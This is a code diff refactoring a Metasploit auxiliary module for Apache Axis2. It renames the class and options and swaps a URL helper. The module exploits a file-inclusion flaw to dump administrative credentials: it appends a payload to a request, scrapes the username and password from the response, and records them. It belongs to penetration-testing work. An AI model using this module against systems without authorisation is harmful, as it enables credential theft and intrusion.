@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
@@ -34,17 +34,12 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options([
       Opt::RPORT(8080),
-      OptString.new('URI', [false, 'The path to the Axis listServices', '/axis2/services/listServices']),
+      OptString.new('TARGETURI', [false, 'The path to the Axis listServices', '/axis2/services/listServices']),
     ], self.class)
   end
 
-  def target_url
-    uri = normalize_uri(datastore['URI'])
-    "http://#{vhost}:#{rport}#{uri}"
-  end
-
   def run_host(ip)
-    uri = normalize_uri(datastore['URI'])
+    uri = normalize_uri(target_uri.path)
 
     begin
       res = send_request_raw({
@@ -53,13 +48,12 @@ class Metasploit3 < Msf::Auxiliary
       }, 25)
 
       if (res and res.code == 200)
-        extract_uri = res.body.to_s.match(/\/axis2\/services\/([^\s]+)\?/)
-        new_uri = "/axis2/services/#{$1}"
-        new_uri = normalize_uri(new_uri)
+        res.body.to_s.match(/\/axis2\/services\/([^\s]+)\?/)
+        new_uri = normalize_uri("/axis2/services/#{$1}")
         get_credentials(new_uri)
 
       else
-        print_status("#{target_url} - Apache Axis - The remote page not accessible")
+        print_status("#{full_uri} - Apache Axis - The remote page not accessible")
         return
 
       end
@@ -106,10 +100,10 @@ class Metasploit3 < Msf::Auxiliary
         'uri'     => "#{uri}" + lfi_payload,
       }, 25)
 
-      print_status("#{target_url} - Apache Axis - Dumping administrative credentials")
+      print_status("#{full_uri} - Apache Axis - Dumping administrative credentials")
 
       if res.nil?
-        print_error("#{target_url} - Connection timed out")
+        print_error("#{full_uri} - Connection timed out")
         return
       end
 
@@ -121,17 +115,17 @@ class Metasploit3 < Msf::Auxiliary
           res.body.scan(/parameter\sname=\"password\">([^\s]+)</)
           password = $1
 
-          print_good("#{target_url} - Apache Axis - Credentials Found Username: '#{username}' - Password: '#{password}'")
+          print_good("#{full_uri} - Apache Axis - Credentials Found Username: '#{username}' - Password: '#{password}'")
 
           report_cred(ip: rhost, port: rport, user: username, password: password, proof: res.body)
 
         else
-          print_error("#{target_url} - Apache Axis - Not Vulnerable")
+          print_error("#{full_uri} - Apache Axis - Not Vulnerable")
           return :abort
         end
 
       else
-        print_error("#{target_url} - Apache Axis - Unrecognized #{res.code} response")
+        print_error("#{full_uri} - Apache Axis - Unrecognized #{res.code} response")
         return :abort
 
       end
